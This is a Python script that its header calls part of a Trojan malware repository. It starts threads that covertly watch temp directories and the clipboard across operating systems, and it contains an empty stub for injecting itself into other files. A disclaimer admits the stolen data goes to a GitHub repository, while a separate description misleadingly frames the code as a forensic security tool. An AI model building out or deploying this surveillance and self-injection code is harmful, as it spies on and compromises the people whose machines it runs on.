#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script provides comprehensive monitoring of file system changes and clipboard activities across 
# different operating systems. It employs platform-specific techniques to track file creations, deletions,
# modifications, renames, copies, and pastes, ensuring heightened awareness of file-related actions. 
# Designed to operate seamlessly on Windows, macOS, and Linux, it offers a vigilant approach 
# to observe and record file events, enhancing security and facilitating forensic analysis 
# when necessary.
#################################################################################################
import os
import tempfile
import threading
import time
import shutil
import platform

# Constants for file actions
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5
FILE_COPIED = 8
FILE_PASTED = 9

# Directories to monitor
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]

# Global variables to store copied and pasted file paths
copied_file_path = None
pasted_file_path = None

def monitor_file_changes(path_to_watch):
    """Monitor file changes on the specified path."""
    if platform.system() == 'Windows':
        from monitor_windows import monitor_windows
        monitor_windows(path_to_watch)
    elif platform.system() == 'Linux':
        from monitor_linux import monitor_linux
        monitor_linux(path_to_watch)
    elif platform.system() == 'Darwin':
        from monitor_macos import monitor_macos
        monitor_macos(path_to_watch)

def monitor_clipboard():
    """Monitor clipboard for file paste actions."""
    if platform.system() == 'Windows':
        from monitor_windows import monitor_clipboard_windows
        monitor_clipboard_windows()
    elif platform.system() == 'Linux':
        from monitor_linux import monitor_clipboard_linux
        monitor_clipboard_linux()
    elif platform.system() == 'Darwin':
        from monitor_macos import monitor_clipboard_macos
        monitor_clipboard_macos()

def inject_into_file(file_path):
    """Inject the script into the file."""
    # Add code here to inject the script into the specified file
    pass

if __name__ == '__main__':
    # Start monitoring file changes
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor_file_changes, args=(path,))
        monitor_thread.start()

    # Start monitoring clipboard for paste actions
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.start()
